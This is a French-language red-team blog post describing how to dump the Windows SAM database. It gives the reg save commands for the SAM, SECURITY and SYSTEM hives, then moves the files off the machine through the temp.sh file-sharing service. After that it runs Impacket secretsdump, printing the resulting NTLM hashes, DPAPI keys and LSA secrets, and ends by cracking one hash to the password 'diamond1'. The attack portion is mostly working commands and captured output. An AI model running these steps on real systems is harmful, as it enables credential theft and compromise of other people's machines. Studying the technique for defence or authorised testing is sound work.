+++
author = "Enzo"
title = "Dump base SAM"
date = "2026-03-05"
categories = [
    "Red Team"
]
tags = [
    "Registre",
    "SAM",
    "secretsdump",
    "Python",
    "Windows"
]
+++
## Intro
La **base SAM** (Security Account Manager) est la base de données locale de Windows, stockée dans le registre sous `HKEY_LOCAL_MACHINE\SAM`, qui gère les comptes utilisateurs locaux, groupes et **hashs NTLM** des mots de passe. Au démarrage, elle est chargée en arrière-plan et interrogée par le processus **LSASS** (`lsass.exe`) pour authentifier les sessions locales.

Malgré son rôle critique, sa **sécurité est faible** : accessible uniquement en privilèges **SYSTEM** ou admin, elle s'extrait facilement via `reg save hklm\sam` après élévation (PsExec, Mimikatz), puis les hashs NT se craquent offline par brute force ou dictionnaire (Impacket, samdump2). Sans protections avancées comme Credential Guard, un attaquant admin compromet tout en quelques commandes.

## Exploitation
Après une élévation de privilège (pas forcément nécessaire si le compte que nous avons dipose des droits : ``SeBackupPrivilege``) nous pouvons exécuté les commandes suivantes : 
```MS-DOS
reg save HKLM\SAM "C:\Windows\Temp\sam.save"
reg save HKLM\SECURITY "C:\Windows\Temp\security.save"
reg save HKLM\SYSTEM "C:\Windows\Temp\system.save"
```

Une fois extraite nous pouvons nous rendre dans le dossier Temp pour vérifier que les registre y sont bien : 
```MS-DOS
PS C:\Windows\Temp> dir

    Répertoire : C:\Windows\Temp

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        05/03/2026     14:40          53248 sam.save
-a----        05/03/2026     14:40          32768 security.save
-a----        05/03/2026     14:40       11071488 system.save
```

Nous pouvons donc maintenant les transférer les "BackUp" vers notre machine, de mon côté j'utilise ``temp.sh``. 

Une fois dans notre machine (exegol pour moi), il faut rentrer cette commande : 
```bash
secretsdump -sam sam.save -system system.save -security security.save LOCAL

Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xf506f5839ff1b3bca4cb9085cc49bd63
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrateur:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Invité:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:8aac1c783ea7d4cd131375a0be698448:::
kiron:1001:aad3b435b51404eeaad3b435b51404ee:ac67fa8a30aa36b5a06b5fb8ce4c01f1:::
root:1002:aad3b435b51404eeaad3b435b51404ee:93dde96f43d7462ef36fbea2e64265af:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM
dpapi_machinekey:0x77b195bed94b8ad49b5ac0a3a596caa05fd1a3e9
dpapi_userkey:0x68170a5d34618129a51bf5514b82a29923487300
[*] NL$KM
 0000   E9 51 D4 37 00 7D A3 55  AF E9 75 AB F8 AC BD 6C   .Q.7.}.U..u....l
 0010   12 D0 2A EE 86 0E C4 EB  92 79 20 08 F9 56 ED FE   ..*......y ..V..
 0020   00 91 F1 6D 39 7C B1 AA  0D 60 64 C3 FC D0 D3 B0   ...m9|...`d.....
 0030   56 D4 78 ED 4C CF 70 B4  D7 B2 E6 F9 40 64 20 33   V.x.L.p.....@d 3
NL$KM:e951d437007da355afe975abf8acbd6c12d02aee860ec4eb92792008f956edfe0091f16d397cb1aa0d6064c3fcd0d3b056d478ed4ccf70b4d7b2e6f940642033
[*] Cleaning up...
```
Ici l'identifiant qui m'intéresse c'est ``root``, je peux donc prendre  le Hash NT te le mettre dans ``CrackStation`` :
![[Pasted image 20260305145659.png]]

Nous pouvons voir ici que le mot de passe est ``diamond1``. 

Il est également possible de cracké le mot de passe avec hashcat. 